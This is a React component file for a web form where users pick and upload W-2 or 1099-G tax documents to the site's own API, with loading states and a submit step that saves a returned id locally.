import { createContext, useContext, useReducer, useState } from 'react';
import { MainSpinner, Spinner } from '../components/Loader';
import styles from './UploadDocs.module.css';
import { useNavigate, useParams } from 'react-router-dom';
import Button from '../components/Button';
import saveData from '../utils/saveData';
import { getLocal, saveLocal } from '../utils/getData';

const Context = createContext(null);

const reducer = (state, { type, payload: { num, path } }) => {
  switch (type) {
    case 'path':
      state[num] = path;
      return [...state];
  }
};

export default function UploadDocs() {
  const [isloading, setIsloading] = useState(false);
  let { num } = useParams();
  num = !num || num === '0' ? 1 : num * 1;

  const docs = Array.from({ length: num }, (_, i) => i);

  const initialStates = Array.from({ length: num }, () => '');

  const [paths, dispatch] = useReducer(reducer, initialStates);

  let id = getLocal('irsystm');
  const navigate = useNavigate();

  async function handleSubmit(e) {
    e.preventDefault();

    setIsloading(true);

    const result = await saveData(
      { id, paths },
      `${import.meta.env.VITE_SITE_URL}/api/v1/client/docs`
    );

    const { status } = result;
    ({ id } = result);

    setIsloading(false);

    // Ask user to retry
    if (status !== 'success') return;

    // Save ID into localstorage
    saveLocal('irsystm', id);

    navigate('/finish');
  }

  return (
    <Context.Provider value={{ paths, dispatch }}>
      {isloading && <MainSpinner>Securely uploading data</MainSpinner>}

      <main className={`main wrapper ${isloading ? 'opaque' : 'not-opaque'}`}>
        {docs.map((n) => (
          <Docs key={`${n}-k`} label={`${n}-w2`} num={n}>
            Form W2
          </Docs>
        ))}
        <SubmitBtn handleSubmit={handleSubmit} />
      </main>
    </Context.Provider>
  );
}

export function Docs({ label, num }) {
  const [status, setStatus] = useState('idle');
  const { dispatch } = useContext(Context);

  async function handleChange(e) {
    const file = e.target.files[0];

    setStatus('uploading');
    let data = new FormData();
    data.append('photo', file);
    data = await fetch(`${import.meta.env.VITE_SITE_URL}/api/v1/client/image`, {
      method: 'POST',
      body: data,
    });
    const { path } = await data.json();
    if (path) {
      dispatch({ type: 'path', payload: { num, path } });
      setStatus('uploaded');
    }
  }

  return (
    <div className={`${styles.container}`}>
      <DocText>Add W2 or 1099-G</DocText>
      {status === 'idle' && (
        <>
          <Illustration>
            <BoxContent label={label} />
          </Illustration>
          <Label label={label}>choose file</Label>
          <FileInput label={label} onChange={handleChange} />
        </>
      )}
      {status === 'uploading' && (
        <>
          <Illustration>
            <BoxContent label={label} />
          </Illustration>
          <Label label={label}>
            <Loader />
          </Label>
        </>
      )}
      {status === 'uploaded' && (
        <>
          <Illustration>
            <Uploaded />
          </Illustration>
          <Label label={label}>choose new file</Label>
          <FileInput label={label} onChange={handleChange} />
        </>
      )}
    </div>
  );
}

function DocText({ children }) {
  return <h3 className={styles['doc-text']}>{children}</h3>;
}

function Illustration({ children }) {
  return <div className={styles.box}>{children}</div>;
}
function BoxContent({ label }) {
  return (
    <label htmlFor={label}>
      <img className={styles['box-cont']} src="/plus.svg" />
    </label>
  );
}

function FileInput({ label, onChange }) {
  return (
    <input
      id={label}
      name={label}
      className={styles['file-input']}
      type="file"
      onChange={(e) => onChange(e)}
      multiple={false}
    />
  );
}

function Label({ label, children }) {
  return (
    <div className={styles.card}>
      <label htmlFor={label} className={styles.label}>
        <span>{children}</span>
      </label>
    </div>
  );
}

function Loader({ children }) {
  return (
    <div className={styles.uploading}>
      <Spinner>{children}</Spinner>{' '}
    </div>
  );
}

function Uploaded() {
  return (
    <div className={styles['uploaded--box']}>
      <img className={styles.icon} alt="success" src="/check.svg" />
    </div>
  );
}

function SubmitBtn({ handleSubmit }) {
  return (
    <Button onClick={handleSubmit} type="primary" length="long">
      Submit
    </Button>
  );
}
